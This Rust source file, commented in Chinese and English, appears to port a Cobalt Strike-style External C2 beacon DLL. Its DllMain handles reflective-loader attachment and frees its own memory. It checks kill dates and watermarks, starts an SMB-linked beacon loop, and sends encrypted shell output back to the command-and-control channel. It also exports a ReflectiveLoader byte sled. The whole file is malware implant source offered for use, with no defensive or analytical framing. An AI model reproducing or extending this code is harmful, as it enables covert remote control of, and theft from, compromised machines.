//! 外部 C2 Beacon DLL 入口（对应 beacon_extc2.cpp + ReflectiveDll.cpp）。
//! External C2 Beacon DLL entry (mirrors beacon_extc2.cpp + ReflectiveDll.cpp).

//! `adjust`/`length` 循环变量与 `shell_callback` 镜像严格遵循 C++ 入口点。
//! The `adjust`/`length` loop variables and `shell_callback`
//! mirrors follow the C++ entry points verbatim.
#![allow(unused_assignments)]
#![allow(dead_code)]

use beacon_core::beacon::{SETTING_JITTER, SETTING_MAXGET, SETTING_SLEEPTIME};
use beacon_core::callback::{command_shell_encrypt, register_command_shell_post};
use beacon_core::client::client_write;
use beacon_core::client_smb_extc2::command_link_wait;
use beacon_core::commands::{bad_watermark, bad_watermark_hash, check_kill_date};
use beacon_core::metadata::agent_init;
use beacon_core::settings::{setting_int, setting_short, settings_init};
use beacon_core::state;
use beacon_core::thread::safe_exit;

const DLL_METASPLOIT_ATTACH: u32 = 0x04;

/// 向客户端通道发送加密并封装好的响应。
/// Sends an encrypted+packaged response to the client channel.
fn shell_post(buffer: &[u8], length: usize, type_: i32, _send_now: bool) {
    let Some(cipherdata) = command_shell_encrypt(buffer, length, type_) else {
        return;
    };
    client_write(&cipherdata, cipherdata.len());
}

fn shell_callback(buffer: &[u8], length: i32, type_: i32) {
    shell_post(buffer, length as usize, type_, false);
}

fn beacon_loop(_lp_reserved: *mut core::ffi::c_void) {
    if check_kill_date() || bad_watermark() || bad_watermark_hash() {
        safe_exit();
        return;
    }

    state::set_sleep_time(setting_int(SETTING_SLEEPTIME));
    state::set_jitter(setting_short(SETTING_JITTER) as u32);

    let mut buffer = vec![0u8; setting_int(SETTING_MAXGET) as usize];
    let buffer_len = buffer.len();
    agent_init(&mut buffer, buffer_len);

    // 启动 SMB Beacon 代码
    // kick off the SMB Beacon code
    command_link_wait();
}

/// DllMain（ReflectiveDll.cpp）。
/// DllMain (ReflectiveDll.cpp).
#[no_mangle]
pub unsafe extern "system" fn DllMain(
    hinst_dll: windows_sys::Win32::Foundation::HINSTANCE,
    dw_reason: u32,
    lp_reserved: *mut core::ffi::c_void,
) -> i32 {
    match dw_reason {
        6 => {}
        1 => {
            settings_init(hinst_dll as usize);
        }
        DLL_METASPLOIT_ATTACH => {
            if setting_short(beacon_core::beacon::SETTING_CLEANUP) == 1 && !hinst_dll.is_null() {
                let mut mbi: windows_sys::Win32::System::Memory::MEMORY_BASIC_INFORMATION =
                    std::mem::zeroed();
                if windows_sys::Win32::System::Memory::VirtualQuery(
                    hinst_dll as *const _,
                    &mut mbi,
                    std::mem::size_of::<windows_sys::Win32::System::Memory::MEMORY_BASIC_INFORMATION>(),
                ) != 0
                {
                    if mbi.Type == windows_sys::Win32::System::Memory::MEM_PRIVATE {
                        windows_sys::Win32::System::Memory::VirtualFree(
                            hinst_dll as *mut _,
                            0,
                            windows_sys::Win32::System::Memory::MEM_RELEASE,
                        );
                    } else if mbi.Type == windows_sys::Win32::System::Memory::MEM_MAPPED {
                        windows_sys::Win32::System::Memory::UnmapViewOfFile(windows_sys::Win32::System::Memory::MEMORY_MAPPED_VIEW_ADDRESS { Value: hinst_dll as *mut _ });
                    }
                }
            }
            register_command_shell_post(shell_post);
            beacon_loop(lp_reserved);
        }
        _ => {}
    }
    return 1;
}

/// ReflectiveLoader sled（相当于 ReflectiveLoader.5k，共 5120 字节）。
/// ReflectiveLoader sled (ReflectiveLoader.5k equivalent, 5120 bytes).
#[no_mangle]
pub static ReflectiveLoader: [u8; 5120] = build_sled();

const fn build_sled() -> [u8; 5120] {
    let mut sled = [0u8; 5120];
    let mut i = 0;
    while i < 5120 {
        sled[i] = 0xCC;
        let mut j = 1;
        while j < 8 && i + j < 5120 {
            sled[i + j] = 0x90;
            j += 1;
        }
        i += 8;
    }
    sled
}
